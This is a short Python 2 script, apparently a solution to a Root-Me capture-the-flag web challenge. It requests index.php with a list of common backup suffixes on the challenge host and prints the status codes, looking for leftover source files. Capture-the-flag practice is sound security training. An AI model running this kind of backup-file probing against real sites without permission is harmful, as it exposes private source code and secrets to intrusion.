import urllib2

list=[".backup",".bck",".old",".save",".bak",".sav","~",".copy",".old",".orig",".tmp",".txt",".back",".bkp",".bac",".tar",".gz",".tar.gz",".zip",".rar"]

fichier ="index"

hote = "http://challenge01.root-me.org/web-serveur/ch11/"

for item in list:
    try:
        url = hote + "" + fichier + "" + ".php" + item
        result=urllib2.urlopen(url)
        print url + " Code : "+str(result.getcode())
    except urllib2.HTTPError as e:
        if e.code == 404:
            print url+" Code :  " + str(e)
        else:
            print url+" Code :  " + str(e)
